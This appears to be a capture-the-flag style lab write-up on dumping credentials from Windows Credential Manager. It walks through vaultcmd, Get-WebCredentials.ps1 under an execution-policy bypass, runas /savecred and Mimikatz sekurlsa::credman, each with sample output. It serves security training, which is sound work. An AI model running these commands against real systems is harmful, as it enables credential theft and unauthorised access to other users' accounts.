# Windows Credential Manager

This task introduces the Windows Credential Manager and discusses techniques for dumping system credentials by exploiting it.

## What is Credential Manager?

Credential Manager is a Windows feature that stores logon-sensitive information for websites, applications, and networks. It contains login credentials such as usernames, passwords, and internet addresses. There are four credential categories:

- **Web credentials:** Authentication details stored in Internet browsers or other applications.
- **Windows credentials:** Windows authentication details, such as NTLM or Kerberos.
- **Generic credentials:** Basic authentication details, such as clear-text usernames and passwords.
- **Certificate-based credentials:** Authentication details based on certificates.

> **Note:** Authentication details are stored in the user's folder and are not shared among Windows user accounts. However, they are cached in memory.

---

## Accessing Credential Manager

You can access the Windows Credential Manager through the GUI (`Control Panel -> User Accounts -> Credential Manager`) or the command prompt. This guide focuses on the command prompt scenario.

---

## Using the Microsoft Credentials Manager (`vaultcmd`)

### Listing Available Vaults

```shell
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
    Vault: Web Credentials
    Vault Guid: 4BF4C442-9B8A-41A0-B380-DD4A704DDB28
    Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

    Vault: Windows Credentials
    Vault Guid: 77BC582B-F0A6-4E15-4E80-61736B6F3B29
    Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

By default, Windows has two vaults: one for Web and one for Windows machine credentials.

---

### Checking for Stored Credentials in "Web Credentials"

```shell
C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
Vault Properties: Web Credentials
Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
Number of credentials: 1
Current protection method: DPAPI
```

---

### Listing Credential Details

```shell
C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
Credentials in vault: Web Credentials

Credential schema: Windows Web Password Credential
Resource: internal-app.thm.red
Identity: THMUser Saved By: MSEdge
Hidden: No
Roaming: Yes
```

---

## Credential Dumping

The `VaultCmd` utility does not display passwords. To retrieve clear-text passwords, you can use PowerShell scripts such as `Get-WebCredentials.ps1`.

### Getting Clear-text Passwords from Web Credentials

```shell
C:\Users\Administrator>powershell -ex bypass
PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser   internal-app.thm.red Password!    {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

The output shows the username and password for accessing the internal application.

---

## RunAs

`RunAs` is a command-line tool that allows running Windows applications or tools under different user permissions. The `/savecred` argument saves the credentials in Windows Credential Manager, so subsequent executions as the same user do not require a password.

---

## Enumerating Stored Credentials with `cmdkey`

```shell
C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```

Stored credentials can be for other servers as well.

---

### Running CMD.exe as a User with `/savecred`

```shell
C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local" ...
```

A new `cmd.exe` window opens. Run `whoami` to confirm the user context. You can now access files available to that user.

---

## Mimikatz

[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a tool that can dump clear-text passwords stored in Credential Manager from memory.

### Dumping Credentials with Mimikatz

```shell
C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
```

---

> The techniques discussed here can also be performed using other tools such as Empire, Metasploit, etc. Explore further to expand your knowledge.
